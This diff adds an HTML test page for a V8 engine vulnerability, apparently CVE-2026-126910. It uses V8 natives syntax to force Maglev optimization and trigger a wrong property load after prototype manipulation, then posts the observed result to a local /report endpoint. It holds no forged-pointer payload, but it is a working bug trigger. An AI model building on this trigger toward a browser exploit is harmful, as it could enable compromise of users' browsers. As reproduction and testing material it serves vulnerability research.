@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>CVE-2026-126910</title>
+</head>
+<body>
+<pre id="result">PENDING</pre>
+<script>
+// Behavioral half of v8 regress-575525282-2.js (object) and -3.js (array).
+// Flags match the regress file: --allow-natives-syntax --maglev.
+// Reports the property the optimized load returned. No forged pointers.
+(function () {
+  "use strict";
+  const OPTIMIZED = 1 << 3;
+  const MAGLEVVED = 1 << 4;
+  const result = document.getElementById("result");
+
+  function emit(payload) {
+    const body = JSON.stringify(payload);
+    result.textContent = "RESULT " + body;
+    try {
+      fetch("/report", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: body,
+      });
+    } catch (err) {
+      result.textContent += "\nPOST " + String(err);
+    }
+  }
+
+  function kindOf() {
+    const path = location.pathname;
+    if (path.indexOf("array") !== -1) return "array";
+    if (path.indexOf("object") !== -1) return "object";
+    return "";
+  }
+
+  function run(kind) {
+    function f(flag) {
+      if (!flag) return 0;
+      if (kind === "array") return [{a: 1, b: 2}];
+      return {a: 1, b: {c: 2}};
+    }
+    %PrepareFunctionForOptimization(f);
+    f(true);
+    f(true);
+    const sib = {a: 1, z: 0};
+    sib.a = 1.5;
+
+    const proto = Object.prototype;
+    proto.x1 = "TRUE";
+    proto[0] = 7;
+    for (let i = 0; i < 80; i++) {
+      proto["k" + i] = (i % 3 === 0) ? "x1" : (i % 3 === 1 ? "WRONG" : 0);
+    }
+    const big = {};
+    Object.defineProperty(big, "g0", {
+      enumerable: true,
+      get() { throw 1; },
+    });
+    for (let i = 0; i < 1100; i++) big["p" + i] = i;
+    try { Object.assign(proto, big); } catch (err) { /* normalize, store nothing */ }
+
+    function h(obj, flag) {
+      obj[0];
+      f(flag);
+      return obj.x1;
+    }
+
+    %PrepareFunctionForOptimization(h);
+    const warm = h(proto, false);
+    %OptimizeMaglevOnNextCall(h);
+    const warmOpt = h(proto, false);
+    const statusBefore = %GetOptimizationStatus(h);
+    const fastBefore = %HasFastProperties(proto);
+    let value = null;
+    let valueType = "missing";
+    let thrown = null;
+    try {
+      const raw = h(proto, true);
+      valueType = typeof raw;
+      value = raw == null ? String(raw) : String(raw).slice(0, 80);
+    } catch (err) {
+      thrown = String(err && err.message ? err.message : err).slice(0, 180);
+    }
+    const statusAfter = %GetOptimizationStatus(h);
+    const fastAfter = %HasFastProperties(proto);
+    emit({
+      case: kind,
+      warm: warm == null ? String(warm) : String(warm).slice(0, 80),
+      warmOpt: warmOpt == null ? String(warmOpt) : String(warmOpt).slice(0, 80),
+      value: value,
+      valueType: valueType,
+      thrown: thrown,
+      statusBefore: statusBefore,
+      statusAfter: statusAfter,
+      fastBefore: fastBefore,
+      fastAfter: fastAfter,
+      maglevBefore: (statusBefore & OPTIMIZED) !== 0 && (statusBefore & MAGLEVVED) !== 0,
+      optimizedAfter: (statusAfter & OPTIMIZED) !== 0,
+    });
+  }
+
+  const kind = kindOf();
+  if (!kind) {
+    emit({case: "idle", value: null, thrown: "open-a-case-path"});
+    return;
+  }
+  try {
+    run(kind);
+  } catch (err) {
+    emit({
+      case: kind,
+      value: null,
+      thrown: String(err && err.message ? err.message : err).slice(0, 180),
+      warm: null,
+      warmOpt: null,
+      statusBefore: null,
+      statusAfter: null,
+      fastBefore: null,
+      fastAfter: null,
+    });
+  }
+})();
+</script>
+</body>
+</html>
